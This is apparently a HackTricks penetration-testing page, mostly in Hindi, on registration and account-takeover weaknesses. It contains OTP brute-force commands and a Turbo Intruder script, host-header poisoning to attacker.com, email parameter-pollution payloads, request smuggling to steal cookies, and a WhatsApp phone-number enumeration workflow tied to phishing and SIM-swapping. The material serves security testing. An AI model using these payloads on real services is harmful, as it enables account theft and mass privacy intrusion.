# पंजीकरण और टेकओवर कमजोरियाँ

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- मौजूद username का उपयोग करके अकाउंट बनाने की कोशिश करें
- ईमेल बदलकर चेक करें:
- अपरकेस
- +1@
- ईमेल में कुछ डॉट डालें
- ईमेल नाम में विशेष कैरेक्टर्स (%00, %09, %20)
- ईमेल के बाद blank कैरेक्टर्स डालें: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- ईमेल प्रोवाइडर canonicalization ट्रिक्स आज़माएँ (service-dependent):
- Gmail dots और subaddressing को ignore करता है: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- कुछ प्रोवाइडर local-part में case-insensitive होते हैं
- कुछ प्रोवाइडर unicode confusables स्वीकार करते हैं। homoglyphs और soft hyphen `\u00AD` को local-part में आज़माएँ
- इनका दुरुपयोग करके: uniqueness checks bypass करें, duplicate accounts/workspace invites प्राप्त करें, या victim के साइन‑अप को ब्लॉक करें (अस्थायी DoS) जब आप takeover तैयार कर रहे हों

### Username Enumeration

जांचें कि क्या आप पता लगा सकते हैं कि किसी username को पहले से ही application में रजिस्टर किया गया है।

- विभिन्न error messages या HTTP status codes
- Timing differences (मौजूदा user IdP/DB lookup ट्रिगर कर सकता है)
- Registration form का autofill profile data के साथ known emails के लिए
- टीम/invite फ्लो चेक करें: कोई ईमेल दर्ज करने पर पता चल सकता है कि अकाउंट मौजूद है या नहीं

### Password Policy

नया user बनाते समय password policy चेक करें (देखें कि क्या आप कमजोर पासवर्ड उपयोग कर सकते हैं)।\
ऐसी स्थिति में आप credentials को bruteforce करने की कोशिश कर सकते हैं।

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

रजिस्टर होने के बाद ईमेल बदलने की कोशिश करें और देखिए कि क्या यह परिवर्तन सही तरीके से validated है या क्या इसे arbitrary ईमेल पर बदला जा सकता है।

### More Checks

- चेक करें कि क्या आप **disposable emails** (mailinator, yopmail, 1secmail, आदि) उपयोग कर सकते हैं या subaddressing जैसे `victim+mailinator@gmail.com` से blocklist को bypass कर सकते हैं
- **लंबा** **password** (>200) **DoS** का कारण बन सकता है
- **Account creation** पर rate limits चेक करें
- username@**burp_collab**.net का उपयोग करें और **callback** का विश्लेषण करें
- यदि phone number verification उपयोग हो रही है, तो phone parsing/injection के edge cases जांचें

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers क्लाइंट के contacts sync करने पर एक **presence oracle** एक्सपोज़ करते हैं। WhatsApp के discovery requests को replay करने से ऐतिहासिक रूप से **>100M lookups per hour** मिले हैं, जिससे लगभग-कम्प्लीट account enumerations संभव हुई हैं।

**Attack workflow**

1. **Official client को instrument करें** ताकि address-book upload request (authenticated blob of normalized E.164 numbers) कैप्चर हो सके। इसे attacker-generated नंबरों के साथ replay करें जबकि वही cookies/device token reuse कर रहे हों।
2. **रिक्वेस्ट पर numbers को batch करें**: WhatsApp हजारों identifiers स्वीकार करता है और registered/unregistered के साथ metadata (business, companion, आदि) रिटर्न करता है। रेस्पॉन्सेस को offline analyze करके बिना victims को मैसेज किए target लिस्ट बनाएं।
3. **Enumeration को horizontally scale करें** SIM banks, cloud devices, या residential proxies के साथ ताकि प्रति-account/IP/ASN throttling ट्रिगर न हो।

**Dialing-plan modeling**

हर देश के dialing plan को मॉडल करें ताकि invalid candidates स्किप किए जा सकें। NDSS dataset (`country-table.*`) देश कोड, adoption density, और platform split बताता है ताकि आप high-hit रेंज प्राथमिकता दे सकें। Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Enumerations को लक्षित हमलों में बदलना**

- leaked फोन नंबर (उदा., Facebook’s 2021 breach) को oracle में डालें ताकि phishing, SIM-swapping, या spamming से पहले पता चल सके कि कौन सी पहचानें अभी भी सक्रिय हैं।
- देश/OS/app प्रकार के हिसाब से censuses को विभाजित करें ताकि उन क्षेत्रों का पता चल सके जहाँ SMS filtering कमजोर है या localized social engineering के लिए WhatsApp Business का भारी adoption है।

**Public-key reuse सहसंबंध**

WhatsApp प्रत्येक खाते की X25519 identity key session setup के दौरान उजागर करता है। हर enumerated नंबर के लिए identity material request करें और public keys को deduplicate करें ताकि account farms, cloned clients, या insecure firmware का पता चल सके — shared keys multi-SIM operations को deanonymize कर देते हैं।

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows अक्सर numeric OTP या magic-link token के माध्यम से ownership verify करते हैं। आम कमजोरियाँ:

- Guessable या छोटे OTP (4–6 digits) जिनमें effective rate limiting या IP/device tracking नहीं है। Parallel guesses और header/IP rotation आज़माएँ।
- OTP का reuse actions या accounts के बीच, या specific user/action से bound न होना (उदा., वही code login और signup दोनों के लिए काम करता है, या email बदलने के बाद भी काम करता है)।
- Multi-value smuggling: कुछ backends कई codes स्वीकार कर लेते हैं और जांचते हैं कि कोई भी match करता है। Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: wrong vs expired vs wrong-user codes को status/message/body length से भेद करें।
- Tokens success के बाद या password/email बदलने पर invalidated नहीं किए जाते।
- Verification token user agent/IP से बाँधा नहीं जाता, जिससे attacker-controlled pages से cross-origin completion की अनुमति मिल जाती है।

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
क्रमिक lockouts को bypass करने के लिए समानांतर/समानकालिक guessing (Burp में Turbo Intruder का उपयोग करें):

<details>
<summary>Turbo Intruder कोड स्निपेट to flood 6‑digit OTP attempts</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: एक ही मान्य OTP दोनों sessions में एक साथ सबमिट करें; कभी-कभी एक session एक verified attacker account बन जाता है जबकि victim का फ्लो भी सफल हो जाता है।
- Also test Host header poisoning on verification links (same as reset poisoning below) ताकि attacker controlled host पर verification को leak या पूरा किया जा सके।

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (पीड़ित के साइन अप करने से पहले)

एक शक्तिशाली श्रेणी की समस्याएँ तब उत्पन्न होती हैं जब एक attacker पीड़ित के ईमेल पर उनके खाते के बनने से पहले कार्रवाइयाँ करता है, और बाद में फिर से एक्सेस हासिल कर लेता है।

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

व्यावहारिक सुझाव

- Web/mobile bundles से flows और endpoints इकट्ठा करें। classic signup, SSO linking, email/phone change, और password reset endpoints देखें।
- अन्य फ़्लोज़ का परीक्षण करते समय sessions को alive रखने के लिए realistic automation बनाएं।
- SSO tests के लिए, एक test OIDC provider चलाएँ और victim address के लिए `email` claims और `email_verified=false` वाले tokens जारी करें ताकि देखा जा सके कि RP unverified IdPs पर भरोसा करता है या नहीं।
- किसी भी password reset या email change के बाद, निम्न बातों की पुष्टि करें:
  - सभी अन्य sessions और tokens invalidated हैं,
  - pending email/phone change क्षमताएँ cancelled की गई हैं,
  - पहले linked IdPs/emails/phones को फिर से re‑verified किया गया है।

नोट: Microsoft की pre‑hijacking research में इन तकनीकों की विस्तृत methodology और केस स्टडीज़ दस्तावेजीकृत हैं (अंत में References देखें)।

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. अपने ईमेल पते पर password reset का अनुरोध करें
2. password reset लिंक पर क्लिक करें
3. पासवर्ड न बदलें
4. किसी भी 3rd party वेबसाइट पर क्लिक करें (उदा.: Facebook, twitter)
5. अनुरोध को Burp Suite proxy में intercept करें
6. देखें कि क्या referer header password reset token को leak कर रहा है।

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. password reset अनुरोध को Burp Suite में intercept करें।
2. Burp Suite में निम्न headers जोड़ें या संपादित करें: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. संशोधित header के साथ अनुरोध forward करें\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_ पर आधारित password reset URL तलाशें, उदाहरण के लिए: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API पैरामीटर <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Attacker को अपने अकाउंट से लॉगइन करके **Change password** फीचर पर जाना होगा।
2. Burp Suite चालू करें और अनुरोध कोIntercept करें\
3. इसे repeater टैब पर भेजें और पैरामीटर एडिट करें: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Password reset token को प्रत्येक बार randomly जनरेट और unique होना चाहिए।\
यह पता करने की कोशिश करें कि क्या token expire होता है या हमेशा वही रहता है; कुछ मामलों में जनरेशन एल्गोरिद्म कमजोर होता है और अनुमान लगाया जा सकता है। एल्गोरिद्म द्वारा निम्न वेरिएबल्स उपयोग किए जा सकते हैं।

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. किसी विशेष ईमेल (उदा: test@mail.com) के लिए API/UI का उपयोग करके password reset request ट्रिगर करें।
2. सर्वर रिस्पॉन्स का निरीक्षण करें और `resetToken` की जांच करें।
3. फिर उस token का उपयोग URL में करें जैसे `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. सिस्टम पर ऐसे username के साथ रजिस्टर करें जो victim के username के समान हो, पर username के पहले और/या बाद में whitespace डालें। उदा: `"admin "`
2. अपने malicious username के साथ password reset का अनुरोध करें।
3. अपने ईमेल पर भेजे गए token का उपयोग करके victim का पासवर्ड रीसेट करें।
4. नए पासवर्ड से victim अकाउंट में लॉगिन करें।

प्लेटफ़ॉर्म CTFd इस हमले के प्रति vulnerable था।\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. यदि cookies parent domain पर scoped हैं (उदा: `*.domain.com`), तो एप्लिकेशन या किसी सबडोमेन में XSS ढूंढें।
2. वर्तमान **sessions cookie** को leak करें।
3. उस cookie का उपयोग करके उपयोगकर्ता के रूप में authenticate करें।

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. **smuggler** का उपयोग करके HTTP Request Smuggling का प्रकार पहचानें (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. ऐसा अनुरोध तैयार करें जो `POST / HTTP/1.1` को निम्न डेटा से overwrite कर दे:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — लक्ष्य यह है कि victims को burpcollab पर open redirect किया जाए और उनकी cookies चोरी की जाएं।\
3. अंतिम अनुरोध कुछ इस तरह दिख सकता है
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone की रिपोर्टें इस बग के शोषण को दर्शाती हैं\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF के लिए एक payload बनाएं, उदाहरण: “HTML form with auto submit for a password change”
2. payload भेजें

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token किसी user को authenticate करने के लिए इस्तेमाल हो सकता है।

- JWT को किसी अन्य User ID / Email के साथ edit करें
- कमज़ोर JWT signature के लिए जाँच करें


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

कुछ signup handlers तब upsert करते हैं जब दिया गया email पहले से मौजूद होता है। अगर endpoint एक minimal body (email और password) स्वीकार करता है और ownership verification लागू नहीं करता, तो victim का email भेजने से उनका password pre-auth overwrite हो जाएगा।

- Discovery: bundled JS (या mobile app traffic) से endpoint names harvest करें, फिर ffuf/dirsearch का उपयोग कर /parents/application/v4/admin/FUZZ जैसे base paths को fuzz करें.
- Method hints: GET से "Only POST request is allowed." जैसे संदेश लौटने पर यह अक्सर सही verb और कि एक JSON body अपेक्षित है का संकेत देता है.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
उदाहरण PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
प्रभाव: Full Account Takeover (ATO) without any reset token, OTP, or email verification.

## संदर्भ

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
